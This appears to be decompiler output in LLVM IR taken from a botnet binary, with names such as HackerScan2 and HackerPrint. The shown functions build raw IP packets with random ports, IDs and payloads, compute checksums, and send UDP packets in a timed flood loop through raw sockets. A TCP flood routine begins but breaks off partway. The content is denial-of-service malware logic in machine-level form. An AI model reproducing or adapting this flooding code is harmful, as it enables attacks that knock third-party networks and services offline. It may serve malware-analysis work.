bb:                                               ; preds = %dec_label_pc_805d610
  %v5_805d61f = shl i32 1, %v2_805d61f
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_805d610, %bb
  %v0_805d621 = phi i32 [ %v5_805d61f, %bb ], [ 1, %dec_label_pc_805d610 ]
  %v1_805d621 = sub i32 0, %v0_805d621
  store i32 %v1_805d621, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d626

dec_label_pc_805d626:                             ; preds = %dec_label_pc_805d601, %bb62
  %storemerge10 = phi i32 [ %v1_805d621, %bb62 ], [ 0, %dec_label_pc_805d601 ]
  %v1_805d629 = add i32 %arg5, 28
  %v1_805d635 = add i32 %arg5, 58
  %v2_805d638 = and i32 %v1_805d635, -16
  %v0_805d63e = load i32, i32* @esp, align 4
  %v2_805d63e = sub i32 %v0_805d63e, %v2_805d638
  %v1_805d64a = add i32 %v2_805d63e, 39
  %v2_805d64d = and i32 %v1_805d64a, -16
  store i32 %v2_805d64d, i32* %edx.global-to-local, align 4
  %v1_805d665 = add i32 %v2_805d64d, 20
  %v5_805d668 = inttoptr i32 %v1_805d665 to i16*
  %v1_805d66e = add i32 %arg5, 8
  store i32 %v1_805d66e, i32* @ebx, align 4
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v2_805d676 = inttoptr i32 %v2_805d63e to i32*
  store i32 %storemerge10, i32* %v2_805d676, align 4
  %v2_805d679 = call i32 @HackerScan2(i32 %v1_805d629, i32 %v2_805d64d)
  store i32 %v2_805d679, i32* %eax.global-to-local, align 4
  %v1_805d67e = load i32, i32* @esp, align 4
  %v2_805d67e = inttoptr i32 %v1_805d67e to i32*
  store i32 %v2_805d679, i32* %v2_805d67e, align 4
  %v0_805d681 = call i32 @__GI_htonl()
  %v3_805d686 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_805d686, i32* %edx.global-to-local, align 4
  %v0_805d689 = load i32, i32* @ebx, align 4
  %v1_805d689 = load i32, i32* @esp, align 4
  %v2_805d689 = add i32 %v1_805d689, 16
  %v3_805d689 = inttoptr i32 %v2_805d689 to i32*
  store i32 %v0_805d689, i32* %v3_805d689, align 4
  %v0_805d68d = load i32, i32* @esp, align 4
  %v1_805d68d = add i32 %v0_805d68d, 12
  %v2_805d68d = inttoptr i32 %v1_805d68d to i32*
  store i32 17, i32* %v2_805d68d, align 4
  %v1_805d695 = load i32, i32* @esp, align 4
  %v2_805d695 = add i32 %v1_805d695, 8
  %v3_805d695 = inttoptr i32 %v2_805d695 to i32*
  store i32 %v0_805d681, i32* %v3_805d695, align 4
  %v0_805d699 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d699 = load i32, i32* @esp, align 4
  %v2_805d699 = add i32 %v1_805d699, 4
  %v3_805d699 = inttoptr i32 %v2_805d699 to i32*
  store i32 %v0_805d699, i32* %v3_805d699, align 4
  store i32 %v2_805d64d, i32* %eax.global-to-local, align 4
  %v1_805d6a0 = load i32, i32* @esp, align 4
  %v2_805d6a0 = inttoptr i32 %v1_805d6a0 to i32*
  store i32 %v2_805d64d, i32* %v2_805d6a0, align 4
  %v0_805d6a3 = call i32 @makeIPPacket()
  %v1_805d6ae = urem i32 %v1_805d66e, 65536
  store i32 %v1_805d6ae, i32* %eax.global-to-local, align 4
  %v1_805d6b1 = load i32, i32* @esp, align 4
  %v2_805d6b1 = inttoptr i32 %v1_805d6b1 to i32*
  store i32 %v1_805d6ae, i32* %v2_805d6b1, align 4
  %v2_805d6b4 = trunc i32 %v1_805d665 to i16
  %v3_805d6b4 = call i32 @__GI_htons(i16 %v2_805d6b4)
  %sext = mul i32 %v3_805d6b4, 65536
  %v1_805d6b9 = sdiv i32 %sext, 65536
  store i32 %v1_805d6b9, i32* %edx.global-to-local, align 4
  store i32 %v1_805d665, i32* %eax.global-to-local, align 4
  %v1_805d6be = trunc i32 %v1_805d6b9 to i16
  %v3_805d6be = add i32 %v2_805d64d, 24
  %v4_805d6be = inttoptr i32 %v3_805d6be to i16*
  store i16 %v1_805d6be, i16* %v4_805d6be, align 8
  %v2_805d6c2 = call i32 @rand_cmwc(i32 %v1_805d665)
  %sext4 = mul i32 %v2_805d6c2, 65536
  %v1_805d6c7 = sdiv i32 %sext4, 65536
  store i32 %v1_805d6c7, i32* %edx.global-to-local, align 4
  store i32 %v1_805d665, i32* %eax.global-to-local, align 4
  %v1_805d6cc = trunc i32 %v1_805d6c7 to i16
  store i16 %v1_805d6cc, i16* %v5_805d668, align 4
  br i1 %v1_805d3ba, label %dec_label_pc_805d6e0, label %dec_label_pc_805d6d5

dec_label_pc_805d6d5:                             ; preds = %dec_label_pc_805d626
  %v2_805d6d5 = call i32 @rand_cmwc(i32 %v1_805d665)
  %.pre = urem i32 %arg2, 65536
  br label %dec_label_pc_805d6f2

dec_label_pc_805d6e0:                             ; preds = %dec_label_pc_805d626
  %v1_805d6e3 = urem i32 %arg2, 65536
  store i32 %v1_805d6e3, i32* %eax.global-to-local, align 4
  %v1_805d6e6 = load i32, i32* @esp, align 4
  %v2_805d6e6 = inttoptr i32 %v1_805d6e6 to i32*
  store i32 %v1_805d6e3, i32* %v2_805d6e6, align 4
  %v3_805d6e9 = call i32 @__GI_htons(i16 %tmp26)
  store i32 %v3_805d6e9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d6f2

dec_label_pc_805d6f2:                             ; preds = %dec_label_pc_805d6d5, %dec_label_pc_805d6e0
  %v1_805d7a7.pre-phi = phi i32 [ %.pre, %dec_label_pc_805d6d5 ], [ %v1_805d6e3, %dec_label_pc_805d6e0 ]
  %storemerge12 = phi i32 [ %v2_805d6d5, %dec_label_pc_805d6d5 ], [ %v3_805d6e9, %dec_label_pc_805d6e0 ]
  %storemerge9 = trunc i32 %storemerge12 to i16
  %v3_805d6f9 = add i32 %v2_805d64d, 22
  %v4_805d6f9 = inttoptr i32 %v3_805d6f9 to i16*
  store i16 %storemerge9, i16* %v4_805d6f9, align 2
  %v1_805d700 = add i32 %v2_805d64d, 26
  %v2_805d700 = inttoptr i32 %v1_805d700 to i16*
  store i16 0, i16* %v2_805d700, align 2
  %v1_805d709 = add i32 %v2_805d64d, 28
  store i32 %v1_805d709, i32* %edx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_805d70f = load i32, i32* @esp, align 4
  %v2_805d70f = add i32 %v1_805d70f, 4
  %v3_805d70f = inttoptr i32 %v2_805d70f to i32*
  store i32 %arg5, i32* %v3_805d70f, align 4
  %v0_805d713 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d713 = load i32, i32* @esp, align 4
  %v2_805d713 = inttoptr i32 %v1_805d713 to i32*
  store i32 %v0_805d713, i32* %v2_805d713, align 4
  %sext14 = mul i32 %storemerge12, 65536
  %v2_805d716 = sdiv i32 %sext14, 65536
  %v3_805d716 = inttoptr i32 %v2_805d716 to i8*
  %v4_805d716 = call i32 @makeRandomStr(i8* %v3_805d716, i32 %v15_805d3ad)
  store i32 %v2_805d64d, i32* %eax.global-to-local, align 4
  %v1_805d71e = or i32 %v2_805d64d, 2
  %v2_805d71e = inttoptr i32 %v1_805d71e to i16*
  %v3_805d71e = load i16, i16* %v2_805d71e, align 2
  %v4_805d71e = zext i16 %v3_805d71e to i32
  store i32 %v4_805d71e, i32* %edx.global-to-local, align 4
  store i32 %v2_805d64d, i32* %eax.global-to-local, align 4
  %v1_805d728 = load i32, i32* @esp, align 4
  %v2_805d728 = add i32 %v1_805d728, 4
  %v3_805d728 = inttoptr i32 %v2_805d728 to i32*
  store i32 %v4_805d71e, i32* %v3_805d728, align 4
  %v0_805d72c = load i32, i32* %eax.global-to-local, align 4
  %v1_805d72c = load i32, i32* @esp, align 4
  %v2_805d72c = inttoptr i32 %v1_805d72c to i32*
  store i32 %v0_805d72c, i32* %v2_805d72c, align 4
  %v3_805d72f = inttoptr i32 %v2_805d716 to i16*
  %v4_805d72f = call i32 @csum(i16* %v3_805d72f, i32 %v15_805d3ad)
  %sext5 = mul i32 %v4_805d72f, 65536
  %v1_805d734 = sdiv i32 %sext5, 65536
  store i32 %v1_805d734, i32* %edx.global-to-local, align 4
  store i32 %v2_805d64d, i32* %eax.global-to-local, align 4
  %v1_805d739 = trunc i32 %v1_805d734 to i16
  %v3_805d739 = or i32 %v2_805d64d, 10
  %v4_805d739 = inttoptr i32 %v3_805d739 to i16*
  store i16 %v1_805d739, i16* %v4_805d739, align 2
  %v0_805d73d = load i32, i32* @esp, align 4
  %v1_805d73d = inttoptr i32 %v0_805d73d to i32*
  store i32 0, i32* %v1_805d73d, align 4
  %v2_805d744 = inttoptr i32 %v2_805d716 to i32*
  %v3_805d744 = call i32 @__GI_time(i32* %v2_805d744)
  %v5_805d749 = add i32 %v3_805d744, %arg3
  store i32 %v5_805d749, i32* %eax.global-to-local, align 4
  %v3_805d7cb = or i32 %v2_805d64d, 4
  %v4_805d7cb = inttoptr i32 %v3_805d7cb to i16*
  %v2_805d7e7 = or i32 %v2_805d64d, 12
  %v3_805d7e7 = inttoptr i32 %v2_805d7e7 to i32*
  br label %dec_label_pc_805d756

dec_label_pc_805d756:                             ; preds = %dec_label_pc_805d814, %dec_label_pc_805d831, %dec_label_pc_805d6f2
  %stack_var_-76.0 = phi i32 [ 0, %dec_label_pc_805d6f2 ], [ %v4_805d831, %dec_label_pc_805d831 ], [ 0, %dec_label_pc_805d814 ]
  %stack_var_-90.0 = phi i16 [ %tmp, %dec_label_pc_805d6f2 ], [ %storemerge, %dec_label_pc_805d831 ], [ %storemerge, %dec_label_pc_805d814 ]
  store i32 %v2_805d64d, i32* %edx.global-to-local, align 4
  %v0_805d75c = load i32, i32* @esp, align 4
  %v1_805d75c = add i32 %v0_805d75c, 20
  %v2_805d75c = inttoptr i32 %v1_805d75c to i32*
  store i32 16, i32* %v2_805d75c, align 4
  %v1_805d764 = load i32, i32* @esp, align 4
  %v2_805d764 = add i32 %v1_805d764, 16
  %v3_805d764 = inttoptr i32 %v2_805d764 to i32*
  store i32 %v2_805d3d9, i32* %v3_805d764, align 4
  %v0_805d768 = load i32, i32* @esp, align 4
  %v1_805d768 = add i32 %v0_805d768, 12
  %v2_805d768 = inttoptr i32 %v1_805d768 to i32*
  store i32 0, i32* %v2_805d768, align 4
  %v1_805d773 = load i32, i32* @esp, align 4
  %v2_805d773 = add i32 %v1_805d773, 8
  %v3_805d773 = inttoptr i32 %v2_805d773 to i32*
  store i32 %v1_805d629, i32* %v3_805d773, align 4
  %v0_805d777 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d777 = load i32, i32* @esp, align 4
  %v2_805d777 = add i32 %v1_805d777, 4
  %v3_805d777 = inttoptr i32 %v2_805d777 to i32*
  store i32 %v0_805d777, i32* %v3_805d777, align 4
  store i32 %v5_805d54d, i32* %eax.global-to-local, align 4
  %v1_805d77e = load i32, i32* @esp, align 4
  %v2_805d77e = inttoptr i32 %v1_805d77e to i32*
  store i32 %v5_805d54d, i32* %v2_805d77e, align 4
  %v1_805d781 = load i32, i32* %stack_var_-72, align 4
  %v2_805d781 = load i32, i32* %stack_var_-68, align 4
  %v3_805d781 = load i32, i32* %stack_var_-64, align 4
  %v4_805d781 = load i32, i32* %stack_var_-60, align 4
  %v6_805d781 = call i32 @__libc_sendto(i32 %stack_var_-76.0, i32 %v1_805d781, i32 %v2_805d781, i32 %v3_805d781, i32 %v4_805d781, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805d781, i32* %eax.global-to-local, align 4
  %v1_805d786 = call i32 @rand_cmwc(i32 %stack_var_-76.0)
  %sext6 = mul i32 %v1_805d786, 65536
  %v1_805d78b = sdiv i32 %sext6, 65536
  store i32 %v1_805d78b, i32* %edx.global-to-local, align 4
  store i32 %v1_805d665, i32* %eax.global-to-local, align 4
  %v1_805d790 = trunc i32 %v1_805d78b to i16
  store i16 %v1_805d790, i16* %v5_805d668, align 4
  br i1 %v1_805d3ba, label %dec_label_pc_805d7a4, label %dec_label_pc_805d799

dec_label_pc_805d799:                             ; preds = %dec_label_pc_805d756
  %v1_805d799 = call i32 @rand_cmwc(i32 %stack_var_-76.0)
  br label %dec_label_pc_805d7b6

dec_label_pc_805d7a4:                             ; preds = %dec_label_pc_805d756
  store i32 %v1_805d7a7.pre-phi, i32* %eax.global-to-local, align 4
  %v1_805d7aa = load i32, i32* @esp, align 4
  %v2_805d7aa = inttoptr i32 %v1_805d7aa to i32*
  store i32 %v1_805d7a7.pre-phi, i32* %v2_805d7aa, align 4
  %v3_805d7ad = call i32 @__GI_htons(i16 %stack_var_-90.0)
  store i32 %v3_805d7ad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d7b6

dec_label_pc_805d7b6:                             ; preds = %dec_label_pc_805d799, %dec_label_pc_805d7a4
  %storemerge13 = phi i32 [ %v1_805d799, %dec_label_pc_805d799 ], [ %v3_805d7ad, %dec_label_pc_805d7a4 ]
  %storemerge = trunc i32 %storemerge13 to i16
  store i32 %v1_805d665, i32* %eax.global-to-local, align 4
  %v4_805d7b9 = urem i32 %storemerge13, 65536
  store i32 %v4_805d7b9, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_805d6f9, align 2
  %sext17 = mul i32 %storemerge13, 65536
  %v1_805d7c1 = sdiv i32 %sext17, 65536
  %v2_805d7c1 = call i32 @rand_cmwc(i32 %v1_805d7c1)
  %sext7 = mul i32 %v2_805d7c1, 65536
  %v1_805d7c6 = sdiv i32 %sext7, 65536
  store i32 %v1_805d7c6, i32* %edx.global-to-local, align 4
  %v1_805d7cb = trunc i32 %v1_805d7c6 to i16
  store i16 %v1_805d7cb, i16* %v4_805d7cb, align 4
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v1_805d7d2 = load i32, i32* @esp, align 4
  %v2_805d7d2 = inttoptr i32 %v1_805d7d2 to i32*
  store i32 %storemerge10, i32* %v2_805d7d2, align 4
  %v3_805d7d5 = call i32 @HackerScan2(i32 %v1_805d7c1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805d7d5, i32* %eax.global-to-local, align 4
  %v1_805d7da = load i32, i32* @esp, align 4
  %v2_805d7da = inttoptr i32 %v1_805d7da to i32*
  store i32 %v3_805d7d5, i32* %v2_805d7da, align 4
  %v0_805d7dd = call i32 @__GI_htonl()
  store i32 %v0_805d7dd, i32* %edx.global-to-local, align 4
  store i32 %v0_805d7dd, i32* %v3_805d7e7, align 4
  store i32 %v2_805d64d, i32* %eax.global-to-local, align 4
  %v3_805d7ed = load i16, i16* %v2_805d71e, align 2
  %v4_805d7ed = zext i16 %v3_805d7ed to i32
  store i32 %v4_805d7ed, i32* %edx.global-to-local, align 4
  store i32 %v2_805d64d, i32* %eax.global-to-local, align 4
  %v1_805d7f7 = load i32, i32* @esp, align 4
  %v2_805d7f7 = add i32 %v1_805d7f7, 4
  %v3_805d7f7 = inttoptr i32 %v2_805d7f7 to i32*
  store i32 %v4_805d7ed, i32* %v3_805d7f7, align 4
  %v0_805d7fb = load i32, i32* %eax.global-to-local, align 4
  %v1_805d7fb = load i32, i32* @esp, align 4
  %v2_805d7fb = inttoptr i32 %v1_805d7fb to i32*
  store i32 %v0_805d7fb, i32* %v2_805d7fb, align 4
  %v3_805d7fe = inttoptr i32 %v1_805d7c1 to i16*
  %v4_805d7fe = call i32 @csum(i16* %v3_805d7fe, i32 ptrtoint (i32* @0 to i32))
  %sext8 = mul i32 %v4_805d7fe, 65536
  %v1_805d803 = sdiv i32 %sext8, 65536
  store i32 %v1_805d803, i32* %edx.global-to-local, align 4
  %v1_805d808 = trunc i32 %v1_805d803 to i16
  store i16 %v1_805d808, i16* %v4_805d739, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_805d80f = icmp eq i32 %stack_var_-76.0, %arg6
  %v1_805d812 = icmp eq i1 %v15_805d80f, false
  br i1 %v1_805d812, label %dec_label_pc_805d831, label %dec_label_pc_805d814

dec_label_pc_805d814:                             ; preds = %dec_label_pc_805d7b6
  %v0_805d814 = load i32, i32* @esp, align 4
  %v1_805d814 = inttoptr i32 %v0_805d814 to i32*
  store i32 0, i32* %v1_805d814, align 4
  %v2_805d81b = inttoptr i32 %v1_805d7c1 to i32*
  %v3_805d81b = call i32 @__GI_time(i32* %v2_805d81b)
  store i32 %v3_805d81b, i32* %eax.global-to-local, align 4
  %v8_805d823 = icmp sgt i32 %v3_805d81b, %v5_805d749
  br i1 %v8_805d823, label %dec_label_pc_805d83a, label %dec_label_pc_805d756

dec_label_pc_805d831:                             ; preds = %dec_label_pc_805d7b6
  %v4_805d831 = add i32 %stack_var_-76.0, 1
  br label %dec_label_pc_805d756

dec_label_pc_805d83a:                             ; preds = %dec_label_pc_805d814, %dec_label_pc_805d5aa, %dec_label_pc_805d55b
  %v0_805d84123 = phi i32 [ %v4_805d5ba, %dec_label_pc_805d5aa ], [ %v4_805d56b, %dec_label_pc_805d55b ], [ %v3_805d81b, %dec_label_pc_805d814 ]
  br label %dec_label_pc_805d83d

dec_label_pc_805d83d:                             ; preds = %dec_label_pc_805d50d, %dec_label_pc_805d463, %dec_label_pc_805d3d9, %dec_label_pc_805d449, %dec_label_pc_805d83a
  %v0_805d841 = phi i32 [ 0, %dec_label_pc_805d463 ], [ %v5_805d3e9, %dec_label_pc_805d3d9 ], [ %v4_805d459, %dec_label_pc_805d449 ], [ %v0_805d84123, %dec_label_pc_805d83a ], [ %v3_805d514, %dec_label_pc_805d50d ]
  ret i32 %v0_805d841

; uselistorder directives
  uselistorder i32 %v1_805d803, { 1, 0 }
  uselistorder i32 %v1_805d7c6, { 1, 0 }
  uselistorder i32 %v1_805d7c1, { 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v1_805d78b, { 1, 0 }
  uselistorder i32 %stack_var_-76.0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_805d734, { 1, 0 }
  uselistorder i32 %v2_805d716, { 2, 1, 0 }
  uselistorder i32 %v1_805d7a7.pre-phi, { 1, 0 }
  uselistorder i32 %v1_805d6e3, { 2, 1, 0 }
  uselistorder i32 %v1_805d6c7, { 1, 0 }
  uselistorder i32 %v1_805d6b9, { 1, 0 }
  uselistorder i32 %v1_805d6ae, { 1, 0 }
  uselistorder i32 %v2_805d64d, { 10, 9, 8, 18, 17, 16, 7, 6, 15, 5, 14, 13, 12, 11, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v2_805d61f, { 1, 0 }
  uselistorder i32 %v4_805d5f763, { 1, 0 }
  uselistorder i32 %v5_805d54d, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %stack_var_-80.0, { 1, 0 }
  uselistorder i8* %v4_805d493, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805d46c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v5_805d43b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_805d3d9, { 1, 0 }
  uselistorder i32 %v1_805d3ca, { 1, 0 }
  uselistorder i8** %stack_var_-124, { 18, 17, 20, 16, 15, 14, 13, 12, 11, 19, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %stack_var_-64, { 1, 2, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %eax.global-to-local, { 4, 3, 5, 6, 7, 9, 8, 10, 0, 11, 12, 15, 13, 14, 16, 17, 18, 19, 20, 1, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 32, 31, 33, 35, 34, 37, 36, 38, 39, 41, 40, 42, 43, 46, 44, 45, 48, 47, 49, 51, 50, 52, 53, 54, 55, 56, 58, 57, 2, 59 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805d83d, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805d7b6, { 1, 0 }
  uselistorder label %dec_label_pc_805d756, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805d6f2, { 1, 0 }
  uselistorder label %dec_label_pc_805d626, { 1, 0 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_805d5cd, { 1, 0 }
  uselistorder label %dec_label_pc_805d50d, { 1, 0 }
  uselistorder label %dec_label_pc_805d4c6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805d3d9, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp30 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i16 @__decompiler_undefined_function_4()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  %v0_805d845 = load i32, i32* @ebx, align 4
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-52, align 4
  %v4_805d85a = icmp eq i32 %arg2, 0
  %v1_805d85e = icmp eq i1 %v4_805d85a, false
  br i1 %v1_805d85e, label %dec_label_pc_805d86b, label %dec_label_pc_805d860

dec_label_pc_805d860:                             ; preds = %entry
  %v15_805d846 = ptrtoint i8** %stack_var_-108 to i32
  %v1_805d860 = call i32 @rand_cmwc(i32 %v15_805d846)
  br label %dec_label_pc_805d87d

dec_label_pc_805d86b:                             ; preds = %entry
  %v1_805d86e = urem i32 %arg2, 65536
  store i32 %v1_805d86e, i32* %eax.global-to-local, align 4
  %v4_805d871 = inttoptr i32 %v1_805d86e to i8*
  store i8* %v4_805d871, i8** %stack_var_-108, align 4
  %v2_805d874 = trunc i32 %arg2 to i16
  %v3_805d874 = call i32 @__GI_htons(i16 %v2_805d874)
  store i32 %v3_805d874, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d87d

dec_label_pc_805d87d:                             ; preds = %dec_label_pc_805d860, %dec_label_pc_805d86b
  %v2_805d87d = ptrtoint i32* %stack_var_-52 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_805d88a = inttoptr i32 %arg1 to i8*
  store i8* %v4_805d88a, i8** %stack_var_-108, align 4
  %v5_805d88d = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-48)
  store i32 %v5_805d88d, i32* %eax.global-to-local, align 4
  %v1_805d892 = icmp eq i32 %v5_805d88d, 0
  br i1 %v1_805d892, label %dec_label_pc_805d89b, label %dec_label_pc_805dd27

dec_label_pc_805d89b:                             ; preds = %dec_label_pc_805d87d
  %v15_805d8ae = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v15_805d8ae, i32* %eax.global-to-local, align 4
  %tmp62 = bitcast i32* %stack_var_-44 to i8*
  store i8* %tmp62, i8** %stack_var_-108, align 4
  %v6_805d8b4 = call i32 @__GI_memset(i8* %tmp62, i32 0, i32 8)
  store i32 %v6_805d8b4, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-108, align 4
  %v5_805d8d0 = call i32 @socket(i32 2)
  store i32 %v5_805d8d0, i32* %eax.global-to-local, align 4
  %v4_805d8d8 = icmp eq i32 %v5_805d8d0, 0
  %v1_805d8dc = icmp eq i1 %v4_805d8d8, false
  br i1 %v1_805d8dc, label %dec_label_pc_805d8f8, label %dec_label_pc_805d8de

dec_label_pc_805d8de:                             ; preds = %dec_label_pc_805d89b
  %v0_805d8de = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805d8de = ptrtoint i8* %v0_805d8de to i32
  store i32 %v1_805d8de, i32* %eax.global-to-local, align 4
  store i8* %v0_805d8de, i8** %stack_var_-108, align 4
  %v4_805d8ee = call i32 @HackerPrint(i32 %v1_805d8de, i32 ptrtoint ([27 x i8]* @global_var_806e5b0.1490 to i32))
  store i32 %v4_805d8ee, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dd27

dec_label_pc_805d8f8:                             ; preds = %dec_label_pc_805d89b
  store i32 1, i32* %stack_var_-56, align 4
  %v2_805d907 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v5_805d8d0, i32* %eax.global-to-local, align 4
  %v4_805d921 = inttoptr i32 %v5_805d8d0 to i8*
  store i8* %v4_805d921, i8** %stack_var_-108, align 4
  %v7_805d924 = call i32 @__GI_setsockopt(i32 %v5_805d8d0, i32 0, i32 3, i32 %v2_805d907, i32 4)
  store i32 %v7_805d924, i32* %eax.global-to-local, align 4
  %v2_805d929 = icmp slt i32 %v7_805d924, 0
  %v1_805d92b = icmp eq i1 %v2_805d929, false
  br i1 %v1_805d92b, label %dec_label_pc_805d947, label %dec_label_pc_805d92d

dec_label_pc_805d92d:                             ; preds = %dec_label_pc_805d8f8
  %v0_805d92d = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805d92d = ptrtoint i8* %v0_805d92d to i32
  store i32 %v1_805d92d, i32* %eax.global-to-local, align 4
  store i8* %v0_805d92d, i8** %stack_var_-108, align 4
  %v4_805d93d = call i32 @HackerPrint(i32 %v1_805d92d, i32 ptrtoint ([33 x i8]* @global_var_806e5cc.1491 to i32))
  store i32 %v4_805d93d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dd27

dec_label_pc_805d947:                             ; preds = %dec_label_pc_805d8f8
  %v4_805d947 = icmp eq i32 %arg4, 0
  %v1_805d94b = icmp eq i1 %v4_805d947, false
  br i1 %v1_805d94b, label %dec_label_pc_805d956, label %dec_label_pc_805d96c

dec_label_pc_805d956:                             ; preds = %dec_label_pc_805d947
  %v5_805d95d = sub i32 32, %arg4
  %v2_805d965 = urem i32 %v5_805d95d, 32
  %v4_805d965 = icmp eq i32 %v2_805d965, 0
  br i1 %v4_805d965, label %bb63, label %bb

bb:                                               ; preds = %dec_label_pc_805d956
  %v5_805d965 = shl i32 1, %v2_805d965
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_805d956, %bb
  %v0_805d967 = phi i32 [ %v5_805d965, %bb ], [ 1, %dec_label_pc_805d956 ]
  %v1_805d967 = sub i32 0, %v0_805d967
  store i32 %v1_805d967, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d96c

dec_label_pc_805d96c:                             ; preds = %dec_label_pc_805d947, %bb63
  %storemerge12 = phi i32 [ %v1_805d967, %bb63 ], [ 0, %dec_label_pc_805d947 ]
  %v1_805d96f = add i32 %arg6, 40
  %v1_805d97b = add i32 %arg6, 70
  %v2_805d97e = and i32 %v1_805d97b, -16
  %v0_805d984 = load i32, i32* @esp, align 4
  %v2_805d984 = sub i32 %v0_805d984, %v2_805d97e
  %v1_805d986 = add i32 %v2_805d984, 24
  store i32 %v1_805d986, i32* %edx.global-to-local, align 4
  %v1_805d990 = add i32 %v2_805d984, 39
  %v2_805d993 = and i32 %v1_805d990, -16
  %v1_805d9ab = add i32 %v2_805d993, 20
  %v5_805d9ae = inttoptr i32 %v1_805d9ab to i16*
  %v1_805d9b4 = add i32 %arg6, 20
  store i32 %v1_805d9b4, i32* @ebx, align 4
  store i32 %storemerge12, i32* %eax.global-to-local, align 4
  %v2_805d9bc = inttoptr i32 %v2_805d984 to i32*
  store i32 %storemerge12, i32* %v2_805d9bc, align 4
  %v2_805d9bf = call i32 @HackerScan2(i32 %v1_805d96f, i32 %v2_805d993)
  store i32 %v2_805d9bf, i32* %eax.global-to-local, align 4
  %v1_805d9c4 = load i32, i32* @esp, align 4
  %v2_805d9c4 = inttoptr i32 %v1_805d9c4 to i32*
  store i32 %v2_805d9bf, i32* %v2_805d9c4, align 4
  %v0_805d9c7 = call i32 @__GI_htonl()
  %v3_805d9cc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_805d9cc, i32* %edx.global-to-local, align 4
  %v0_805d9cf = load i32, i32* @ebx, align 4
  %v1_805d9cf = load i32, i32* @esp, align 4
  %v2_805d9cf = add i32 %v1_805d9cf, 16
  %v3_805d9cf = inttoptr i32 %v2_805d9cf to i32*
  store i32 %v0_805d9cf, i32* %v3_805d9cf, align 4
  %v0_805d9d3 = load i32, i32* @esp, align 4
  %v1_805d9d3 = add i32 %v0_805d9d3, 12
  %v2_805d9d3 = inttoptr i32 %v1_805d9d3 to i32*
  store i32 6, i32* %v2_805d9d3, align 4
  %v1_805d9db = load i32, i32* @esp, align 4
  %v2_805d9db = add i32 %v1_805d9db, 8
  %v3_805d9db = inttoptr i32 %v2_805d9db to i32*
  store i32 %v0_805d9c7, i32* %v3_805d9db, align 4
  %v0_805d9df = load i32, i32* %edx.global-to-local, align 4
  %v1_805d9df = load i32, i32* @esp, align 4
  %v2_805d9df = add i32 %v1_805d9df, 4
  %v3_805d9df = inttoptr i32 %v2_805d9df to i32*
  store i32 %v0_805d9df, i32* %v3_805d9df, align 4
  store i32 %v2_805d993, i32* %eax.global-to-local, align 4
  %v1_805d9e6 = load i32, i32* @esp, align 4
  %v2_805d9e6 = inttoptr i32 %v1_805d9e6 to i32*
  store i32 %v2_805d993, i32* %v2_805d9e6, align 4
